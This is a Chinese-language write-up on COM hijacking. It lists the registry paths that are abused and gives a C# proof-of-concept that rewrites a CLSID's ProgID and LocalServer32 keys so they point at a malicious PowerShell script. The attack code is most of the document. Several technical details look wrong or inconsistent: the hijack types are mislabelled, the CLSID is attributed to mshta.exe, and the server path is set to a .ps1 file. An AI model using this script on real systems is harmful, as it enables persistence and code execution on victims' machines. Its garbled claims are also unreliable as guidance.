### **技术实现框架**
#### **1. 注册表劫持机制**
COM劫持主要利用以下注册表路径：
- **`HKEY_CLASSES_ROOT\CLSID\{GUID}\LocalServer32`**（DLL劫持）
- **`HKEY_CLASSES_ROOT\CLSID\{GUID}\InprocServer32`**（DLL劫持）
- **`HKEY_CLASSES_ROOT\CLSID\{GUID}\ProgID`**（EXE劫持）
- **`HKEY_CLASSES_ROOT\TypeLib\{GUID}\1.0\0\win32`**（脚本劫持）

#### **2. PoC代码示例（C#）**
以下代码演示如何劫持`mshta.exe`的CLSID，将其指向恶意PowerShell脚本：

```csharp
using Microsoft.Win32;
using System;
using System.Diagnostics;

class ComHijackPoC
{
    static void Main()
    {
        // 目标CLSID（示例：mshta.exe的CLSID）
        string targetClsid = "{0002DF01-0000-0000-C000-000000000046}";
        string targetProgId = "HTML.Application";
        string maliciousPayloadPath = @"C:\Temp\malicious.ps1"; // 恶意PowerShell脚本路径

        // 1. 修改ProgID关联（EXE劫持）
        ModifyProgId(targetClsid, targetProgId, maliciousPayloadPath);

        // 2. 修改LocalServer32（DLL劫持）
        ModifyLocalServer32(targetClsid, maliciousPayloadPath);

        Console.WriteLine($"[+] COM劫持成功！CLSID {targetClsid} 已指向 {maliciousPayloadPath}");
        Console.WriteLine("[!] 注意：此操作在生产环境中可能触发安全警报。");
    }

    static void ModifyProgId(string clsid, string progId, string payloadPath)
    {
        using (RegistryKey key = Registry.ClassesRoot.OpenSubKey($@"CLSID\{clsid}\ProgID", true))
        {
            if (key != null)
            {
                key.SetValue("", progId);
                Console.WriteLine($"[*] 修改ProgID: {clsid} -> {progId}");
            }
        }

        // 创建反向关联（ProgID -> CLSID）
        using (RegistryKey key = Registry.ClassesRoot.CreateSubKey($@"WOW6432Node\{progId}"))
        {
            key.SetValue("", $"CLSID\\{clsid}");
            Console.WriteLine($"[*] 创建ProgID反向关联: {progId} -> {clsid}");
        }
    }

    static void ModifyLocalServer32(string clsid, string payloadPath)
    {
        using (RegistryKey key = Registry.ClassesRoot.OpenSubKey($@"CLSID\{clsid}\LocalServer32", true))
        {
            if (key != null)
            {
                key.SetValue("", payloadPath);
                Console.WriteLine($"[*] 修改LocalServer32: {clsid} -> {payloadPath}");
            }
        }
    }
}
```

